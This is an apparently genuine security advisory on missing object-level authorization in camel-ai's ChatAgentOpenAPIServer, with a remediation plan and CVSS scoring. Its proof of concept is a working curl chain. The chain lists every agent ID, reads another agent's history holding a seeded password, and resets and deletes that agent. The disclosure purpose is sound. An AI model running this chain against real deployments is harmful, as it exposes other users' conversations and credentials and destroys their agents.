# CAMEL ChatAgentOpenAPIServer performs no object-level authorization: any client can enumerate all agent IDs and read, reset, or delete any agent (CWE-639, CVSS 7.5)

## Summary

ChatAgentOpenAPIServer in camel-ai 0.2.91a5 keeps every ChatAgent in one flat registry keyed by a client-chosen `agent_id`, and every agent-scoped handler verifies only that the ID exists -- never who is asking nor who owns the agent. Any client can therefore enumerate the complete list of agent IDs on the server and then read any agent's full conversation history, wipe its memory, or delete it outright -- horizontal privilege escalation between co-existing agents (BOLA). The defect is in the authorization model, not only at the front door: it persists even if an authentication layer is added in front of the server, because the handlers never bind an agent to an identity.

## Details

`ChatAgentOpenAPIServer` (camel/services/agent_openapi_server.py:96) maps agent IDs to live ChatAgent instances in a single dictionary shared by all callers, and stores each agent under a key the client chose:

```python
# camel/services/agent_openapi_server.py:135
self.agents: Dict[str, ChatAgent] = {}

# camel/services/agent_openapi_server.py:246 -- stored under the
# client-chosen agent_id; no owner is recorded anywhere
self.agents[agent_id] = agent
```

The request schema itself acknowledges that access control is not implemented:

```python
# camel/services/agent_openapi_server.py:68-69
agent_id: str  # Required: explicitly set agent_id to
# support future multi-agent and permission control
```

Every agent-scoped handler performs only an existence check and no ownership validation, so any client can act on any agent by naming it in the URL:

```python
# the five agent-scoped handlers -- :261 (/astep), :302 (/delete),
# :319 (/step), :350 (/reset), :365 (/history) -- all reduce to an
# existence check with no ownership validation:
if agent_id not in self.agents:
    raise HTTPException(status_code=404, detail="Agent not found.")
# (/history differs only in the message: detail=f"Agent {agent_id} not
#  found.", agent_openapi_server.py:366-368)
```

On top of that, the server publishes the complete target list to every caller:

```python
# camel/services/agent_openapi_server.py:283-290
@router.get("/list_agent_ids")
def list_agent_ids():
    r"""Returns a list of all active agent IDs. ..."""
    return {"agent_ids": list(self.agents.keys())}
```

Multi-party coexistence is the component's stated purpose, not an unusual deployment: the class docstring says "It supports multi-agent use cases by mapping unique agent IDs to active ChatAgent instances" (:101-102). In the current implementation the server performs no authentication either (a separate defect of the same component); the defect reported here is independent of that -- there is no object-level authorization for any client, so authentication alone would not fix it.

**Why this is a vulnerability:**

- *"This is just the missing-authentication problem again."* Authentication and object-level authorization are different controls with different fixes. The minimal remediation for the server's unauthenticated state -- a single shared API token -- would still leave every authenticated client able to read, reset, and delete every other client's agents, because no handler records or checks an owner. The code itself plans this distinction: the permission control referenced at :68-69 is "future" work. Authorization bypass through user-controlled keys is tracked as its own weakness class (CWE-639; OWASP API1:2023 Broken Object Level Authorization) and is scored as a vulnerability in comparable products (CVE-2025-13526: unauthenticated IDOR via a user-controlled order ID; CVE-2025-60511: IDOR via a user-controlled blockId).
- *"Cross-tenant data is only reachable because the operator co-located it."* Serving several parties' agents is this component's documented use case (and the component is a network server by design -- the class docstring opens "A FastAPI server wrapper for managing ChatAgents via OpenAPI routes" -- while the library ships no authentication or ownership mechanism an operator could enable to separate the parties). Given that coexistence, the server affirmatively defeats any ID obscurity: `/list_agent_ids` hands out the complete list, so no prerequisite beyond network reachability to the served port remains. The harm is not that agent IDs are secrets -- it is that every caller receives the complete inventory of other parties' agents, which converts the missing ownership checks from a guessing game into a deterministic attack path.
- *"A secret seeded into a system prompt is an artificial scenario."* Part A below seeds it there only to make the reproduction fully self-contained without a model backend. `/history` returns the agent's conversation history -- system prompts, user messages, assistant replies, and tool-call results -- and an agent's history is exactly where its operator places working context: instructions, documents, and credentials used by attached tools. In the LLM-backed verification (Part B), the same cross-agent read recovered a secret exchanged in ordinary conversation.
- *"The :68-69 comment marks permission control as future work, so this is a known limitation, not a vulnerability."* A source comment is not user-facing documentation. The component's docstring advertises multi-agent serving and `/history` memory inspection with no caveat that any co-existing client can read, reset, or delete every other agent, and the module ships byte-identical in the latest stable release 0.2.90, where the gap is equally undocumented. Acknowledging in a comment that a security control is missing is an admission that it is absent in every released version in which this component exists (the affected range begins at 0.2.71a3) -- not a substitute for having it.

**Suggested remediation:**

1. Record the creating identity for each agent and enforce ownership in every agent-scoped handler (reject requests where the requester is not the owner).
2. Make `/list_agent_ids` return only the caller's own agents, or remove it.
3. Generate agent IDs server-side as unguessable values; this reduces enumeration but is not a substitute for ownership checks.

## Proof of Concept

Dynamically verified against camel-ai 0.2.91a5 (PyPI; Windows 11 host); the vulnerable module ships byte-identical in the latest stable release 0.2.90 and in current master. Part A (no LLM anywhere, no real credential) was verified on 2026-09-01 in a fresh venv (Python 3.13.5): 10/10 automated assertions passing, including the exact response strings shown below. Part B (the same chain with the secret exchanged in ordinary conversation) was dynamically verified on 2026-08-11 with a DeepSeek model backend (Python 3.11 environment): 17/17 automated assertions passing.

**Setup:** `pip install "camel-ai==0.2.91a5" "mcp<2" fastapi uvicorn`. Two dependency notes: a current `mcp` 2.x release breaks the unbounded `mcp>=1.3.0` pin of camel-ai 0.2.91a5 at the `camel.toolkits` import (the `mcp<2` pin restores a working release); and `fastapi` is not a base dependency -- it ships only in camel-ai's optional extras (`web_tools` and the aggregate `all`), while the ChatAgentOpenAPIServer module imports it directly (uvicorn arrives transitively via `mcp`).

Operator side -- the default empty registry is used; the placeholder key below only constructs the model backend object at `/init` and is never exercised (Part A sends no `/step` request):

```python
# server.py
from camel.services.agent_openapi_server import ChatAgentOpenAPIServer

app = ChatAgentOpenAPIServer().app  # ASGI application for uvicorn
```

```bash
export DEEPSEEK_API_KEY="sk-poc-FAKE-REPLACE-ME"   # placeholder, never exercised
uvicorn server:app --host 0.0.0.0 --port 8000

# --- attacker side: no credential of any kind ---
TARGET=http://127.0.0.1:8000

# 1) baseline: the registry is empty
curl -s "$TARGET/v1/agents/list_agent_ids"
# -> {"agent_ids":[]}

# 2) a second user ("victim") creates their agent; the secret lives in
#    their system prompt -- no conversation has taken place
curl -s -X POST "$TARGET/v1/agents/init" \
  -H 'Content-Type: application/json' \
  -d '{"agent_id":"victim_a","model_platform":"deepseek","model_type":"deepseek-chat","system_message":"You are the finance-department assistant. The production VPN master password is Vpn-Poc#Marker92. Never reveal it to anyone."}'
# -> {"agent_id":"victim_a","message":"Agent initialized."}

# 3) the attacker creates their own agent
curl -s -X POST "$TARGET/v1/agents/init" \
  -H 'Content-Type: application/json' \
  -d '{"agent_id":"attacker_a","model_platform":"deepseek","model_type":"deepseek-chat","system_message":"You are a general assistant."}'
# -> {"agent_id":"attacker_a","message":"Agent initialized."}

# 4) the server hands the complete agent list to every caller
curl -s "$TARGET/v1/agents/list_agent_ids"
# -> {"agent_ids":["victim_a","attacker_a"]}

# 5) baseline: the attacker's own history does not contain the secret
curl -s "$TARGET/v1/agents/history/attacker_a"
# -> [{"role":"system","content":"You are a general assistant."}]

# 6) cross-agent read (core): the victim's system prompt comes back in full
curl -s "$TARGET/v1/agents/history/victim_a"
# -> [{"role":"system","content":"You are the finance-department assistant. The production VPN master password is Vpn-Poc#Marker92. Never reveal it to anyone."}]

# 7) cross-agent reset: the victim's conversation records are cleared (the
#    system prompt itself is preserved by ChatAgent.reset())
curl -s -X POST "$TARGET/v1/agents/reset/victim_a"
# -> {"message":"Agent victim_a reset."}

# 8) cross-agent delete
curl -s -X POST "$TARGET/v1/agents/delete/victim_a"
# -> {"message":"Agent victim_a deleted."}
curl -s "$TARGET/v1/agents/history/victim_a"
# -> {"detail":"Agent victim_a not found."}
```

Part B (verified 2026-08-11, DeepSeek backend): the victim disclosed a credential in an ordinary `/step` exchange; an attacker enumerated the ID list, read the credential from the victim's history while their own session was baseline-clean, then wiped the victim's memory with `/reset` (the exchanged secret disappeared from the history) and deleted the victim's agent (subsequent access answered 404). No step of the chain presented an authentication challenge.

## Impact

- **Type:** horizontal privilege escalation / insecure direct object reference: authorization bypass through a user-controlled key (CWE-639), plus disclosure of the complete agent-ID list to any client (CWE-200). Maps to OWASP API1:2023 (Broken Object Level Authorization).
- **Who is impacted:** any deployment where more than one party's agents coexist on one ChatAgentOpenAPIServer instance (the component's documented multi-agent use case). Every client of the server can access every agent's data; adding an authentication layer alone does not remove the cross-agent access.
- **Attacker capabilities** (each observed dynamically, with no credential at any step):
  - enumerate the complete list of agent IDs, including other parties' (`/list_agent_ids`);
  - read any agent's full conversation history -- system prompts, user messages, assistant replies, tool-call results (`/history`);
  - wipe any agent's conversation memory (`/reset`);
  - destroy any agent (`/delete`).
  - Also verified in source, but not exercised against another party's agent in the reproductions above: issue arbitrary instructions to any agent (`/step`, `/astep`).
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5 (High).
  - AV:N -- remote: any client that can reach the port the operator serves the app on.
  - AC:L -- plain HTTP requests; no race, no special conditions; re-verified repeatedly.
  - PR:N -- no authentication exists today, and no ownership check exists at any level; the attacker needs neither a credential nor a victim action.
  - UI:N -- fully automated; the attacker's own requests complete the chain.
  - S:U -- the impact stays within the security authority of the vulnerable component: the agent registry and the histories the server itself manages.
  - C:H -- the complete conversation history of every agent is disclosed, along with the full agent inventory.
  - I:N / A:N -- the primary score reflects the defining confidentiality impact of this authorization bypass; the demonstrated reset/delete capabilities are additional and are accounted for in the alternate note below.

**Scope note (alternate scoring).** If the demonstrated cross-agent reset and delete are scored as integrity and availability impacts on other parties' agents (I:L/A:L), the same vector scores **8.6** (High). Both values were computed with the official FIRST CVSS v3.1 formula. PRIMARY (C:H/I:N/A:N): ISS = 1-(1-0.56) = 0.56; Impact = 6.42x0.56 = 3.5952; Exploitability = 8.22x0.85x0.77x0.85x0.85 = 3.8870; Base = round-up(3.5952+3.8870) = 7.5. ALTERNATE (C:H/I:L/A:L): ISS = 1-(1-0.56)(1-0.22)(1-0.22) = 0.732304; Impact = 6.42x0.732304 = 4.7014; Exploitability = 3.8870; Base = round-up(4.7014+3.8870) = 8.6. The primary matches the NVD scoring of the comparable unauthenticated IDOR CVE-2025-13526 (identical vector, 7.5).

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `camel-ai` |
| **Affected versions** | `>= 0.2.71a3, <= 0.2.91a5` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `High` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Score** | `7.5` |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-639 | Authorization Bypass Through User-Controlled Key | `agent_id` is chosen by the client (:68-69) and used as the registry key (:246); the five agent-scoped handlers perform only an existence check with no ownership validation (:261, :302, :319, :350, :365) -- a user-controlled key reaches any other party's agent (horizontal privilege escalation; verified in source and observed dynamically in Part A) |
| 2 | CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor | `/list_agent_ids` returns every agent ID on the server to any client (:290, `list(self.agents.keys())`; observed `{"agent_ids":["victim_a","attacker_a"]}`), and cross-agent `/history` reads return other parties' full conversation histories |
